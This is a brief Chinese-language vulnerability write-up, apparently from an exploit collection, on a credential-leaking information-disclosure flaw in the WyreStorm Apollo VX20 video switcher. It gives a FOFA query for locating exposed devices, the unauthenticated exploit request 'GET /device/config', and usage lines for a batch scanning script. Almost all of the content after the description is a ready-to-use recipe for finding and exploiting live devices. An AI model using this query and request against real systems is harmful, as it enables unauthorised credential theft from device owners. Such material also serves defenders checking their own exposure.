# WyreStorm Apollo VX20 信息泄露漏洞

### 1.漏洞描述

Apollo VX20具有多个视频输入和输出端口，可以将不同的视频源（如电视机、投影仪、游戏机、电脑等）连接到不同的显示设备上。通过使用Apollo VX20，用户可以轻松切换和控制不同的视频信号，以实现灵活的多源多目标视频分发和管理。

该系统存在敏感信息泄露漏洞，攻击者通过该漏洞可以获取凭证等信息。

### 2.fofa语法

```
icon_hash="-893957814"
```

### 3.漏洞复现

```
GET /device/config HTTP/1.1
```

![image.png](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719830802788-6a40423c-a93e-4153-89b1-ae633849d9de.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_937%2Climit_0)

### 4.py脚本使用

```
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```

